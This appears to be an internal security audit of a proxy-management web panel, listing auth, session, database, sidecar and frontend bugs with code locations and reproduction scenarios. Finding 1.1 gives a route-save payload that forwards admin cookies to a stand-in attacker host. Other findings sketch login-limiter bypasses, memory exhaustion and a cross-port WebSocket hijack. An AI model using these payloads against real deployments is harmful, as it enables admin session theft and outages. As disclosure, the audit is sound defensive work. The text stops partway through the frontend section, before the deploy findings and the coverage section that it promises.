# Known issues — audit of the native line

Read-only audit of commit `941b13a3` (`native-edge-listen`, parent `02808e05` /
`origin/native`). Five independent passes covered HTTP/auth/session,
DB/runtime/services, sidecars/network runtimes, the React frontend, and
deploy/integrations. Nothing in this document has been fixed.

Severity here is P1/P2/P3: P1 is blocking (security, data loss, corruption or a
severe production failure), P2 is a real functional or reliability bug, P3 is a
minor but legitimate defect. Findings are ordered by area, not by priority.

**Verification status.** Every finding is traced through the production call
chain and cites `file:line`. Where a finding says "reproduced", it was driven
through the real handler/function with an isolated in-memory or overlay test;
everything else is code-path evidence only. No live panel, node, Docker image,
installer or PostgreSQL server was run, so no finding claims a passing
integration test. See “Coverage and limits” at the end.

Tally: **13 × P1, 43 × P2, 5 × P3**.

| Area | P1 | P2 | P3 |
|---|---:|---:|---:|
| HTTP, auth, session | 1 | 10 | 1 |
| DB, services, runtime | 7 | 4 | 0 |
| Sidecars and network runtimes | 0 | 5 | 1 |
| Frontend | 2 | 16 | 2 |
| Deploy and integrations | 3 | 8 | 1 |

---

## 1. HTTP, auth, session

### 1.1 P1 — A `node-sync` token can intercept admin cookies through an edge HTTP route

- **Where:** `internal/web/controller/api.go:125–126`,
  `internal/web/service/edge.go:175–207`, `internal/web/web_edge.go:33–40`,
  `internal/edge/http.go:142–179`.
- **Scenario:** with a `node-sync` token, `POST /panel/api/edge/routes/save` with
  `{"kind":"http","enable":true,"match":"","pathPrefix":"/panel/settings","target":"https://attacker.example","stripPrefix":false}`.
  When the administrator later opens `/panel/settings`, the request goes to the
  upstream together with `Cookie: 3x-ui=…`.
- **Effect:** privilege escalation `node-sync → admin`; theft of the admin
  session and substitution of pages on the panel origin.
- **Why guards do not stop it:** the scoped token is explicitly allowed to save
  routes. The HTTP router is installed before Gin (`internal/web/web.go:682–685`),
  so an intercepted request never sees authentication, CSRF, the domain
  validator or the panel CSP. The reverse proxy keeps `Cookie` and
  `Authorization` (`internal/edge/http.go:95–113`). The “do not hide the panel”
  check only rejects any-host + `/`, not admin sub-paths
  (`internal/web/service/edge.go:281–289`). The HTTP table is applied even when
  the dedicated edge listener is off.

### 1.2 P2 — Unauthenticated clients can hold gigabytes of memory with long login usernames

- **Where:** `internal/web/controller/index.go:65–76, 95–99`,
  `internal/web/controller/login_limiter.go:70–79, 99–130`.
- **Scenario:** fetch the public cookie/CSRF from `/csrf-token`, then send
  `/login` with a non-empty password and distinct non-existent usernames of
  ~9 MiB each. Each JSON request stays under the 10 MiB limit.
- **Effect:** every username is stored verbatim in the key of the global
  `attempts` map. 200 such entries retain ~1.8 GiB of key strings; OOM stops the
  panel.
- **Why guards do not stop it:** username length is unbounded and the limiter
  caps the number of entries, not their size. Each new username produces a
  single failure, so the five-failure lockout never triggers. Expired foreign
  entries are only swept once the map reaches 10 000 entries. CSRF is
  obtainable before login and is no obstacle for a scripted client.

### 1.3 P2 — The documented Caddy deployment lets `X-Real-IP` bypass the login limiter

- **Where:** `internal/web/controller/util.go:20–37`,
  `internal/web/service/setting.go:45`, `docs/lib/xray/reverse-proxy.ts:50–60`.
- **Scenario:** use the generated Caddy config (`reverse_proxy 127.0.0.1:2053`)
  and send login requests for one username while changing
  `X-Real-IP: 198.51.100.1`, `.2`, `.3`, …
- **Effect:** one external client gets a fresh limiter bucket per request and can
  keep guessing the password/2FA without changing its real IP. The spoofed IP
  also reaches notifications and the login log.
- **Why guards do not stop it:** the backend trusts loopback by default and
  prefers `X-Real-IP` over `X-Forwarded-For`. Caddy rewrites `X-Forwarded-*`
  but passes other incoming headers such as `X-Real-IP` through. The generated
  config does not strip it. A direct connection from an untrusted IP is not
  affected: forwarded headers are ignored there.

### 1.4 P2 — Parallel login requests pass the limit before the first failure is recorded

- **Where:** `internal/web/controller/index.go:81, 95–99`,
  `internal/web/controller/login_limiter.go:45–85`.
- **Scenario:** for an existing username, fire a burst of simultaneous login
  requests with wrong passwords and a valid pre-fetched CSRF. Requests that
  reach `allow()` before the first bcrypt check finishes still run the
  credential check.
- **Effect:** “five failed attempts” does not bound the number of checks in a
  parallel burst. Works on a direct connection, no header spoofing needed.
- **Why guards do not stop it:** the mutex protects map operations, but
  DB/bcrypt/LDAP/2FA happen between “attempt allowed” and “result recorded”.
  In-flight attempts are not tracked and `CheckUser` does not re-check the
  lockout, so a lockout does not stop requests already in flight.

### 1.5 P2 — `sessionMaxAge` does not bound server-side session validity

- **Where:** `internal/web/web.go:221–232`,
  `internal/web/session/session.go:70–88`.
- **Scenario:** set `sessionMaxAge=1`, restart the panel, log in, keep the cookie
  value, and after more than a minute send it manually to
  `/panel/api/server/getDb`.
- **Effect:** the server accepts the cookie past the configured expiry — up to
  the library default of 30 days while the login epoch is unchanged.
- **Why guards do not stop it:** `store.Options(sessionOptions)` only changes
  cookie attributes. In `gin-contrib/sessions v1.1.1`,
  `cookie.(*store).Options` assigns `CookieStore.Options` without calling
  `CookieStore.MaxAge`; `gorilla/sessions v1.4.0` codecs start at 30 days, which
  is what `securecookie.Decode` checks. `GetLoginUser` has no issue-time check;
  the epoch checks revocation, not age.

### 1.6 P2 — Logout deletes the browser cookie but does not revoke the saved session

- **Where:** `internal/web/controller/index.go:139–148`,
  `internal/web/session/session.go:162–179, 80–88`.
- **Scenario:** keep an authenticated cookie, perform a normal `/logout` with
  CSRF, then replay `/panel/api/server/getDb` with the old cookie value.
- **Effect:** admin access survives logout. The owner of the old cookie can get
  CSRF from the public `/csrf-token` for state-changing requests.
- **Why guards do not stop it:** logout only calls `ClearSession`, which clears
  the current payload and sends a deleting `Set-Cookie`. There is no server-side
  revocation record and `LoginEpoch` is unchanged, so the signature and epoch of
  the saved cookie stay valid. Changing credentials does invalidate the epoch;
  a normal logout does not.

### 1.7 P2 — An open WebSocket keeps receiving secrets after the session is revoked

- **Where:** `internal/web/controller/websocket.go:65–78`,
  `internal/web/service/panel/websocket.go:40–53, 67–79, 94–112`,
  `internal/web/controller/inbound.go:43–59`.
- **Scenario:** open `/ws` with a valid session and keep it alive by answering
  pings. Change the admin password or enable 2FA, invalidating old HTTP
  sessions. From the new session create or edit an inbound.
- **Effect:** the old connection keeps receiving broadcasts, including full
  inbounds and client credentials, despite the dead session.
- **Why guards do not stop it:** authentication happens only before the
  upgrade. The connection keeps a random client ID but no user ID, epoch or
  expiry; the pumps only check socket state. Full inbounds go into the shared
  broadcast (`internal/web/service/inbound.go:190–200`), and on small
  installations the payload is not replaced by an invalidate signal.

### 1.8 P2 — WebSocket origin check accepts another port on the same hostname

- **Where:** `internal/web/controller/websocket.go:28–47, 65–72`.
- **Scenario:** the admin is logged in at `https://panel.example:2053`. An
  attacker-controlled page at `https://panel.example:9443` runs
  `new WebSocket("wss://panel.example:2053/ws")` (with the base path prefix if
  configured).
- **Effect:** a cross-origin page can read the admin WebSocket, including the
  config broadcasts from the previous finding.
- **Why guards do not stop it:** only the hostname is compared; scheme and port
  are dropped. Browsers treat different ports as different origins, but cookies
  are not port-isolated, and same-site `SameSite=Lax` does not block the request
  under the same HTTPS scheme. The upgrade has no separate CSRF confirmation.
  The scenario requires an attacker-controlled app on another port of the same
  hostname.

### 1.9 P2 — The `monitor` token bypasses the body limit and allows unbounded GET-body reads

- **Where:** `internal/web/middleware/bodylimit.go:22–28`,
  `internal/web/middleware/config_envelope.go:27–42`,
  `internal/web/controller/api.go:84–95, 150–153, 182–187`.
- **Scenario:** send `GET /panel/api/server/status` with a valid monitor token, a
  large body and `X-Config-Sha256: invalid`. A body of hundreds of MiB works; no
  correct hash or zstd is needed.
- **Effect:** the whole body is allocated in memory before the hash mismatch is
  rejected. A few requests exhaust panel memory with read-only credentials.
- **Why guards do not stop it:** `MaxBodyBytes` skips GET on the assumption that
  GET has no body. The scope allowlist permits this endpoint. The shared
  config-envelope middleware then calls `io.ReadAll` with no wire-size limit;
  the decompression limit is not engaged here. The read timeout bounds time, not
  bytes received in that time.

### 1.10 P2 — With HTTPS terminated by a reverse proxy the admin cookie has no `Secure`

- **Where:** `internal/web/web.go:165–172, 221–228`; supported TLS-termination
  setup: `docs/lib/xray/reverse-proxy.ts:25–60`.
- **Scenario:** terminate TLS in Nginx/Caddy and proxy to the panel's HTTP
  listener without `webCertFile`/`webKeyFile`. Log in over the public HTTPS URL
  and inspect `Set-Cookie`: `3x-ui` has no `Secure`.
- **Effect:** the browser may send the admin cookie over HTTP to a matching
  host/path; a network attacker can capture the session before any server
  redirect.
- **Why guards do not stop it:** `Secure` is keyed off a *local* TLS keypair,
  not the external HTTPS scheme; a trusted `X-Forwarded-Proto` is ignored. HSTS
  is not emitted in this mode either (`internal/web/web.go:187–189`).
  `HttpOnly` blocks JS reads but not HTTP transmission. An externally configured
  HSTS or cookie rewrite would close the scenario; nothing in the panel's own
  configuration does.

### 1.11 P2 — A TLS certificate load failure silently downgrades the listener to plaintext HTTP

- **Where:** `internal/web/web.go:654–678`,
  `internal/util/certreload/certreload.go:26–33`.
- **Scenario:** configure HTTPS, then make the certificate/key unavailable or
  invalid and restart. Send a plain HTTP request to the same TCP port.
- **Effect:** instead of refusing to start the protected listener, the panel
  serves login and API over plaintext HTTP, and new login cookies get
  `Secure=false`.
- **Why guards do not stop it:** the `certreload.New` error is only logged. The
  already-open raw listener stays in service and is handed to `http.Server`; the
  TLS redirect wrapper is only built on the success path.
  `isDirectHTTPSConfigured()` also returns false, disabling Secure/HSTS, but
  does not abort startup. This is not a claim that a correct HTTPS client
  downgrades automatically — the problem is the unprotected auth surface being
  opened despite configured TLS.

### 1.12 P3 — An already-used TOTP code is accepted again for new sessions

- **Where:** `internal/util/totp/totp.go:14–21`,
  `internal/web/service/panel/user.go:94–106`,
  `internal/web/controller/index.go:115–124`.
- **Scenario:** get separate pre-login cookies/CSRF for two clients. Log in with
  the first, then with the second using the same username, password and the
  already-used OTP while the code is still in the accepted time window.
- **Effect:** one intercepted code creates additional independent sessions after
  its legitimate use. The acceptance window with current skew is up to
  ~90 seconds.
- **Why guards do not stop it:** the verifier is a pure code comparison over
  three time steps. Neither it nor `CheckUser` records the successfully used
  step. A successful login also resets the limiter bucket. The attack needs the
  password and a still-valid used OTP, hence the lower severity.

---

## 2. DB, services, runtime

### 2.1 P1 — Remote inbound reset uses the master's ID and can zero a different inbound

- **Where:** `internal/web/runtime/remote.go:746–748`.
- **Scenario:** inbound `A` is ID `17` on the master and `3` on the node; the node
  has another inbound `B` with ID `17`. Reset `A` on the master (or wait for its
  scheduled reset).
- **Chain:** `internal/web/controller/inbound.go:323–337` →
  `internal/web/service/inbound_traffic.go:850–875` → remote runtime. The child
  controller reads the URL number as its own local ID.
- **Effect:** `B` is reset, `A` is not. If ID `17` does not exist on the node the
  remote call fails, the master service only logs it, and returns success.
- **Why:** `Remote.ResetInboundTraffic` puts `ib.Id` straight into the URL and,
  unlike `UpdateInbound`/`DelInbound`, never calls `resolveRemoteID`.

### 2.2 P1 — A stale remote-ID cache can overwrite an unrelated inbound after ID reuse

- **Where:** `internal/web/runtime/remote.go:299–302, 456–462`.
- **Scenario:**
  1. The master caches `A → 1`.
  2. While the node is unreachable from the master, the operator deletes the last
     inbound `A` on the node and creates a new `B` with another tag/port. Deleting
     the last inbound resets the SQLite sequence
     (`internal/web/service/inbound.go:1493–1500`), so `B` gets ID `1`.
  3. A pending edit for `A` remains on the master; connectivity returns.
- **Effect:** reconcile sees the fresh list with `B` but calls
  `ReconcileInbound` → `UpdateInbound` for the missing `A`
  (`internal/web/service/inbound_node.go:141–195`, `remote.go:488–500`), which
  takes the stale ID `1` from the cache. `/update/1` replaces `B`'s config with
  `A`'s; the unrelated inbound and its membership are lost with no identity
  check.
- **Why:** on a cache hit `tag → remote ID` is never re-validated.
  `ListInboundOptions` and `FetchTrafficSnapshot` read fresh lists but do not
  update this cache (`remote.go:375–384, 788–797`).

### 2.3 P1 — The serial writer does not protect read-modify-write; CRUD rolls back accounted traffic

- **Where:** `internal/web/service/client_inbound_apply.go:362, 526–564`;
  same pattern at `671, 912–977`.
- **Scenario:** `AddInboundClient` reads an inbound with `up=100`; the traffic job
  commits `+50`, so the DB has `up=150`; client CRUD then reaches the writer and
  saves the earlier full object, restoring `up=100`.
- **Effect:** irreversible loss of local inbound traffic and under-counting of
  its quota; lifecycle/settings changed between the read and the save can also
  roll back.
- **Why:** the inbound is read and modified *before* `runSerializedTx`, and the
  full old object is saved inside it with `tx.Save(oldInbound)`. The writer
  serializes the write, not the read-modify-write. Traffic is added atomically
  (`internal/web/service/inbound_traffic.go:115–121`), but the later full `Save`
  destroys it; `lockInbound` does not help because the traffic job does not use
  it. The same shape exists in `UpdateInbound` (`inbound.go:1720, 1992`) and the
  bulk mutation paths.

### 2.4 P1 — Auto-renew re-enables a client the operator disabled by hand

- **Where:** `internal/web/service/inbound_traffic.go:424–427, 497–510`.
- **Scenario:** create a client with `reset=30`, future expiry and unused quota;
  disable it through the UI/API; leave it disabled until expiry.
- **Chain of a manual disable:** `SetClientEnableByEmail` →
  `UpdateInboundClient` (`client_inbound_apply.go:1348–1358, 924–935`) →
  `UpdateClientStat`, which writes `"enable": client.Enable`
  (`inbound_traffic.go:599–609`). `BulkSetEnable` also disables the traffic row
  (`client_bulk.go:1638–1645`).
- **Effect:** after expiry, auto-renew selects the row regardless of why it was
  disabled and puts the user back into the runtime. An administratively disabled
  account restores its own access.
- **Why:** auto-renew treats `client_traffics.enable=false` as a quota-disable
  and unconditionally sets `traffic.Enable=true` and `settings.enable=true`,
  but a manual disable writes the same `false`.
  `TestAutoRenewClients_PreservesOperatorDisabledClient` does not cover the real
  caller: it manually creates `traffic.Enable=true` with settings disabled
  (`inbound_autorenew_shared_email_test.go:102–104`).

### 2.5 P1 — Scheduled inbound reset and global client reset do not restore depletion-disabled clients

- **Where:** `internal/web/service/client_traffic.go:156–158, 192–212`.
- **Scenario:** an inbound has `trafficReset=daily` and a client has its own
  `never` cycle. The client hits its quota; the scheduled reset fires.
- **Caller:** `internal/web/job/periodic_traffic_reset_job.go:90–100` calls
  `ResetAllClientTraffics`, not `ResetTrafficByEmail`.
- **Effect:** counters are zero and the traffic gate is enabled, but the client
  stays disabled in the normalized record and settings. A restart does not fix
  it: `GetXrayConfig` skips clients with `c.Enable=false`
  (`internal/web/service/xray.go:241–249`). `/clients/resetAllTraffics` breaks
  the same way. The existing global-reset test only checks the traffic row
  (`traffic_commit_test.go:51–69`).
- **Why:** both paths set `enable=true` only in `client_traffics`, while real
  quota depletion also disables `clients.enable` and `settings.clients[].enable`
  (`internal/web/service/inbound_disable.go:135, 172–175, 217–218`).

### 2.6 P1 — Bulk/global client reset does not reset runtime quota on nodes or in MTProto

- **Where:** `internal/web/service/client_traffic.go:58–113, 192–212`.
- **Scenario (node):** a client exhausted its quota on a child panel. Call
  `/clients/bulkResetTraffic` on the master. Even if the preceding `Update`
  re-enabled the user on the node, the node's accumulated `up/down` remain, and
  the next lifecycle tick disables the client again by the old quota.
- **Scenario (MTProto):** an enabled client used part of its allowance. The bulk
  reset zeroes panel counters but the sidecar keeps counting the used part and
  blocks the client earlier than the new panel quota.
- **Effect:** the API reports a successful reset but no new allowance is actually
  granted. Restarting local Xray from the controller
  (`controller/client.go:715–716`) does not reset child-panel or MTProto
  counters.
- **Why:** the bulk reset changes the central DB and removes baselines but never
  calls `Runtime.ResetClientTraffic`, and global reset is DB-only. The
  single-client path does perform those calls
  (`inbound_traffic.go:679–692`; MTProto: `inbound_mtproto.go:107–117`).

### 2.7 P1 — Live PostgreSQL export can skip existing rows because of OFFSET paging without a snapshot

- **Where:** `internal/database/migrate_data.go:201, 212–214, 235–241`.
- **Scenario:** in a DB with more than 500 inbounds, the export reads IDs
  `1…500`; another request deletes inbound `1`; the next query uses `OFFSET 500`
  and now starts at ID `502`, skipping the still-existing `501`.
- **Effect:** the export represents no single point in time. The transferred
  `.db` can be missing a live inbound while its clients/hosts arrive in later
  tables; import-time orphan cleanup then deletes the remaining bindings and
  hosts (`internal/database/db.go:943–965`). Restoring that file loses
  configuration nobody deleted.
- **Why:** `ExportPostgresToSQLite` reads a live PostgreSQL through a normal
  `*gorm.DB`, with no shared snapshot transaction, and pages with
  `LIMIT 500 OFFSET …`. The caller `internal/web/service/server.go:1590–1607`
  exports live data without stopping writes.

### 2.8 P2 — The IP-limit job can return an already-disabled or deleted client to Xray

- **Where:** `internal/web/job/check_client_ip_job.go:676–689`.
- **Scenario:** IP-limit enforcement is on. During the `100 ms` gap between
  `RemoveUser` and `AddUser`, the operator disables the client or the traffic job
  disables it by quota. For a clean reproduction use
  `restartXrayOnClientDisable=false`.
- **Effect:** the DB shows a disabled client, but the fail2ban-allowed IP keeps
  completing new handshakes. Later quota ticks do not correct it:
  `disableInvalidClients` only selects `enable=true` rows
  (`internal/web/service/inbound_disable.go:84–87`), and this row is already
  disabled.
- **Why:** the job re-adds the user from the previously read `clientConfig`
  after a fixed delay, with no re-check of enable/existence and no service
  locks or runtime dispatch.

### 2.9 P2 — A failed remote reset is reported as success and never retried

- **Where:** `internal/web/service/inbound_traffic.go:684–692, 868–877`.
- **Scenario:** a node keeps serving clients but its management API is
  temporarily unavailable. Perform a single-client traffic reset on the master.
  Central counters and baselines have already been zeroed
  (`inbound_traffic.go:759–781`), the remote reset fails, and the controller
  answers success.
- **Effect:** the operator gets a false confirmation. The client stays blocked by
  the old quota or is blocked again after re-enabling.
- **Why:** remote reset errors are only logged. Dirty/reconcile does not help:
  reconcile sends inbound configuration, not a traffic reset, and `wireInbound`
  carries no usage counters or reset command (`remote.go:845–878`).

### 2.10 P2 — An accepted API `reset` value makes the single traffic writer loop forever

- **Where:** `internal/web/service/inbound_traffic.go:467–479`.
- **Input:** a client with past expiry, `reset=18014398509481984` (`2^54`),
  `resetDay=0`, `resetMax=0`.
- **Effect:** the interval is computed as `int64(traffic.Reset) * 86400000` with
  no overflow check; on 64-bit the product wraps exactly to `0`. `newExpiryTime`
  never changes and unlimited `resetMax=0` gives no other exit, so the next
  traffic tick occupies the serial writer forever and waiting
  accounting/CRUD requests hang. After restart the row is still there and
  `GetXrayConfig` starts maintenance again (`xray.go:198`).
- **Why:** the check above only rejects a non-positive `Reset`. The controller
  accepts `ClientCreatePayload` (`controller/client.go:188–194`); `Create`
  validates `ResetDay` and `ResetMax` but not the `Reset` range
  (`client_crud.go:140–149`). The model field is a plain unbounded `int`
  (`database/model/model.go:953`). The signed-int64 overflow to `0` was
  verified separately.

### 2.11 P2 — Reset All Client Traffic leaves group baselines in the old coordinate system

- **Where:** `internal/web/service/client_traffic.go:192–207`.
- **Scenario:** a group has accumulated `100` upload; reset the group (baseline
  becomes `100`); accumulate `50` more; run `/clients/resetAllTraffics`;
  accumulate `25`.
- **Effect:** `ListGroups` computes `max(sum(up)-ResetUp, 0)`
  (`internal/web/service/client_groups.go:57–60`), which is
  `max(25-100,0)=0`. Real new group traffic stays hidden until the old baseline
  is reached again.
- **Why:** global reset zeroes all client counters without adjusting
  `ClientGroup.ResetUp/ResetDown`, unlike single/bulk reset. The invariant that
  group totals survive client resets is already pinned for single/bulk paths in
  `client_group_reset_test.go:130–174`.

---

## 3. Sidecars and network runtimes

### 3.1 P2 — Clearing optional AWG parameters does not reset them on the running device

- **Where:** `internal/amneziawgnet/device.go:272–276, 205–242`; the outbound
  equivalent is `internal/amneziawgnet/client_device.go:31–68`.
- **Scenario:** set `H1=100`, then clear H1 without changing address/MTU.
  `Manager.ensureLocked()` calls `IpcSet()` on the existing device
  (`manager.go:177`), but `writeOptionalLine()` never sends an empty value.
- **Effect:** the saved config diverges from the runtime; later reconciles do not
  fix it because the newly rendered config was already recorded as applied. If
  the peer falls back to the default wire format, the tunnel sides stop
  understanding each other. The same applies to H/I parameters and
  conditionally emitted padding/timing fields.
- **Verification:** reproduced — after clearing H1 the live device returned
  `h1=100` while a fresh device with the same desired config returned `h1=1`.
  Real caller: `internal/web/runtime/local.go:207–225`.
- **Why:** in UAPI the absence of a parameter means “keep the previous value”,
  not “return to default”.

### 3.2 P2 — The AWG outbound truncates TCP responses on half-close

- **Where:** `internal/amneziawgnet/egress.go:399–407`.
- **Scenario:** the client sends a request, calls `CloseWrite()` and keeps
  reading the response. One of the two `io.Copy()` calls finishes on EOF;
  `relayTCP()` returns immediately after the first `<-done`, closing the tunnel
  connection, and the caller closes the SOCKS connection.
- **Effect:** instead of propagating a one-way FIN, the whole channel is closed.
  Services that answer after the request EOF cannot deliver their response, and
  in-flight data may be lost. Production caller: SOCKS CONNECT at
  `internal/amneziawgnet/egress.go:255–268`.
- **Verification:** reproduced through two connected in-memory netstacks; the
  expected `response after EOF` was lost and the client received `""`.

### 3.3 P2 — Identical inbound/outbound tags mix traffic and break quotas

- **Where:** `internal/xray/api.go:881–894`.
- **Scenario:** an inbound and an outbound share a tag (they are different Xray
  namespaces).
- **Effect:** `GetTraffic()` merges both into one map keyed by tag.
  `IsInbound`/`IsOutbound` keep the first record while `Up`/`Down` are
  overwritten by the later one, so traffic is lost or attributed to the wrong
  entity and limits fire incorrectly. Both consumers account from this result:
  `internal/web/job/xray_traffic_job.go:78–86`.
- **Verification:** reproduced with a gRPC stats fixture — inbound uplink `11`
  and outbound uplink `22` produced one record
  `IsInbound:true IsOutbound:false Tag:same Up:22`.

### 3.4 P2 — MTProto loses the first traffic interval of every new client

- **Where:** `internal/mtproto/manager.go:437–440`.
- **Scenario:** the sidecar is already running; a new client first appears in
  `/stats` with non-zero cumulative counters. If the email is absent from
  `last`, the collector does `continue` and stores the entire first volume only
  as a baseline.
- **Effect:** the first bytes of each client are permanently missing from
  panel-side client accounting and, for non-routed inbounds, from inbound
  accounting. If a short session finishes before the first scrape and sends
  nothing afterwards, the panel never records its bytes. This is not a claim
  that the sidecar's own quota guard is bypassed.
- **Verification:** reproduced — after the baseline for Alice, Bob added with
  `1234/5678` bytes produced an empty `CollectTraffic()` result. The caller only
  persists returned deltas: `internal/web/job/mtproto_job.go:44–75`.

### 3.5 P2 — Reconcile does not retry a failed IPv6 alias addition

- **Where:** `internal/amneziawgnet/manager.go:163–166, 242–243`; error handling
  in `internal/amneziawgnet/v6alias.go:120–148`.
- **Scenario:** the first application runs `ip -6 addr add` while the external
  interface is temporarily unavailable. The manager still records the desired
  `Instance` as current.
- **Effect:** later reconciles compare desired state with the already-recorded
  desired state, get an empty diff and never retry. Even after the interface
  recovers, per-peer IPv6 egress stays broken until the config changes or the
  managed instance is recreated.
- **Verification:** reproduced — two consecutive `Ensure()` calls made one alias
  attempt instead of two. Periodic caller:
  `internal/web/job/amneziawg_job.go:26–50`.

### 3.6 P3 — A late DNS callback creates a UDP session after association teardown

- **Where:** `internal/amneziawgnet/egress.go:474–484, 520–548`.
- **Scenario:** a SOCKS UDP ASSOCIATE datagram has a domain target and starts an
  async DNS lookup. Before the answer arrives, the control TCP closes:
  `relayUDP()` runs `sessions.closeAll()` and returns. The DNS callback then
  calls `deliverUDPDatagram()`; the session map has no `closed` state, so
  `getOrDial()` creates a new endpoint and pump.
- **Effect:** a packet is sent after the association ended. The new
  endpoint/goroutine is not covered by the completed teardown and, with no
  replies, lives until the 2-minute idle timeout. Bounded resource leak, not
  permanent.
- **Verification:** reproduced by delaying the DNS answer until after
  `relayUDP()` returned; the target received `late payload`.

---

## 4. Frontend

### 4.1 P1 — Saving an inbound overwrites clients with a stale snapshot

- **Where:** `frontend/src/pages/inbounds/form/InboundFormModal.tsx:439–466,
  558–585`.
- **Scenario:** open inbound editing; in another tab add, delete or disable one
  of its clients; in the first tab change only the remark/port and save.
- **Effect:** a new client is detached, a deleted one can come back, and changes
  to existing clients are rolled back by a save of an unrelated field.
- **Why:** the form submits the full `settings.clients` snapshot taken when it
  opened; new list data never refreshes `formDbInbound`, and there is no
  version/actuality check. The backend accepts the snapshot as a replacement:
  `internal/web/service/inbound.go:1897, 1995–2000` replaces settings and calls
  `SyncInbound`; `internal/web/service/client_link.go:84–85, 238–243, 279–281`
  deletes bindings missing from the snapshot, while
  `client_link.go:138–146, 171–178` can re-create an already deleted record.

### 4.2 P1 — Editing a WireGuard + AmneziaWG client overwrites different keys with one set

- **Where:** `frontend/src/pages/clients/ClientFormModal.tsx:380–384, 719–738`.
- **Scenario:** one client identity is attached to WG and AWG with different
  peer keys (for example after importing independently configured inbounds).
  Open the client, change only the comment, save.
- **Effect:** one of the tunnels loses its previous identity and stops working
  with the configuration already issued to the client.
- **Why:** the form has a single `wgPrivateKey`/`wgPublicKey`/PSK set but sends
  `allowedIPsByInbound` for both inbounds. The backend guard against spreading
  shared keys only works in the branch *without* the corresponding
  `allowedIPsByInbound` entry (`internal/web/service/client_crud.go:683–692`);
  with the map present both peers receive the shared non-empty set, and the
  previous-key preservation in `client_inbound_apply.go:734–738` no longer
  applies.
- **Verification:** payload shape reproduced in-memory.

### 4.3 P2 — Toggling a single client's enable wipes the MTProto ad-tag

- **Where:** `frontend/src/hooks/useClients.ts:678–709`.
- **Scenario:** an MTProto client has a sponsor `adTag`; toggle its enable in the
  Clients table.
- **Effect:** flipping activity also removes the sponsor channel setting.
- **Why:** `hydrate()` returns `adTag`, but the hand-built update payload omits
  it. The backend unconditionally writes `updated.AdTag`
  (`internal/web/service/client_crud.go:791–796`), so the missing field becomes
  an empty string.
- **Verification:** omitted field confirmed by executing the handler.

### 4.4 P2 — An existing AWG port forwarding cannot be removed from the form

- **Where:** `frontend/src/pages/clients/ClientFormModal.tsx:747–748,
  1320–1326`.
- **Scenario:** clear the forwarded-ports field and save the client.
- **Effect:** the form saves successfully but previously opened ports stay open.
- **Why:** the frontend sends `forwardedPorts: ""`, but the backend treats an
  empty string as “do not change” and restores the old value
  (`internal/web/service/client_inbound_apply.go:769–775`). Clearing the PSK has
  the same conflict (frontend omits an empty field at lines `722–724`; backend
  keeps the old PSK at `763–764`).

### 4.5 P2 — A failed fallback fetch turns into deletion of existing rules

- **Where:** `frontend/src/pages/inbounds/form/useInboundFallbacks.ts:21–29,
  53–71`.
- **Scenario:** open a TLS/Reality inbound with fallbacks; the fallback list GET
  fails; change only the remark and save after connectivity returns.
- **Effect:** an unrelated edit deletes fallback routes.
- **Why:** a failed load sets `fallbacks = []` and does not distinguish an error
  from a genuinely empty list; the next save submits an empty replacement and
  the backend first deletes all previous rules
  (`internal/web/service/fallback.go:60–65`).
- **Verification:** the sequence “failed GET → POST `{fallbacks: []}`” was
  reproduced in-memory.

### 4.6 P2 — A fallback save error is ignored and the modal closes

- **Where:** `frontend/src/pages/inbounds/form/InboundFormModal.tsx:586–593`;
  `useInboundFallbacks.ts:71`.
- **Scenario:** the main inbound update succeeds but the separate fallback POST
  is rejected or fails on the network.
- **Effect:** fallback changes are lost and the window closes as if saved; an
  error toast, if any, does not prevent data loss.
- **Why:** `saveFallbacks()` returns a boolean, but the caller does not check it
  and unconditionally calls `onSaved()`/`onClose()`.

### 4.7 P2 — Attach/Detach clients windows are empty on first open

- **Where:** `frontend/src/pages/inbounds/clients/AttachClientsModal.tsx:56–73`;
  `DetachClientsModal.tsx:51–65`.
- **Scenario:** after the page loads, open “Attach clients” or “Detach clients”
  on a non-empty inbound for the first time.
- **Effect:** an empty table and an unavailable operation; closing and reopening
  works around it.
- **Why:** `LazyMount` first mounts the component already with `open=true`
  (`InboundsPage.tsx:859–883`, `components/utility/LazyMount.tsx:14–18`);
  `syncedSource` is initialized to the current `openSource`, so the difference
  check that fills `clientRows` is false.
- **Verification:** both init blocks reproduced in-memory.

### 4.8 P2 — Creating a Host inherits fields from the previously edited Host

- **Where:** `frontend/src/pages/hosts/HostFormModal.tsx:97–107`;
  `HostsPage.tsx:231`.
- **Scenario:** edit Host A, close the window, press Add Host. Also reproducible
  after save/cancel of creation and pressing Add again.
- **Effect:** the new record gets the previous form's addresses, inbound
  bindings and overrides.
- **Why:** a closed window and creation share the `openHost = null` marker. On
  close `syncedHost` is updated but the form is not reset, so the next Add sees
  equal markers and skips `methods.reset()`. The component stays mounted.
- **Verification:** the edit → close → add transition was reproduced in-memory.

### 4.9 P2 — An applied certificate is rolled back by a later Settings save

- **Where:** `frontend/src/api/queries/useCerts.ts:71–77, 99–101`.
- **Scenario:** open Settings; go to Certificates and apply a certificate to
  web/sub; return to Settings without a hard reload and save another field.
- **Effect:** the new TLS paths are replaced with the old (possibly empty) ones;
  after a restart the certificate application is undone.
- **Why:** applying a certificate only invalidates `certs`. Settings stay in a
  cache with `staleTime: Infinity` (`useAllSettings.ts:32–35`), and `saveAll()`
  posts the whole stale object (`84–86`). The backend changes certificate paths
  at `certificate.go:808–817`, and the later `UpdateAllSetting` rewrites the
  fields wholesale (`setting.go:1592–1601`).

### 4.10 P2 — The DNS schema drops an existing per-server `clientIp`

- **Where:** `frontend/src/schemas/dns.ts:16–31`, especially line 25.
- **Scenario:** Xray DNS server has `"clientIp": "2001:db8::1"`; open Xray
  settings and save any change.
- **Effect:** the ECS setting disappears from the saved config even without
  editing DNS.
- **Why:** the schema knows `clientIP`, not `clientIp`. A plain `z.object()` strips
  unknown fields on a successful parse, and `fetchXrayConfig()` then uses the
  transformed result (`hooks/useXraySetting.ts:117–122`). The editor also reads
  only `clientIP` (`DnsServerModal.tsx:87`). The canonical backend
  representation is confirmed by `internal/xray/dnsconf/dnsconf_test.go:23`.

### 4.11 P2 — A routing rule with a numeric port cannot be saved through the form

- **Where:** `frontend/src/pages/xray/routing/RuleFormModal.tsx:112–114,
  131–133`.
- **Scenario:** an existing rule has `port: 443`, `sourcePort: 12345` or a numeric
  `vlessRoute`; open it and change the comment.
- **Effect:** the save button appears dead; the valid existing rule cannot be
  edited without rewriting the offending field.
- **Why:** the API/config schema allows a number (`schemas/routing.ts:6, 21–28`),
  but the reset copies the value without converting it to a string, while the
  form schema requires strings (`schemas/xray.ts:117–120`). `submit()` just
  returns on error with no message.

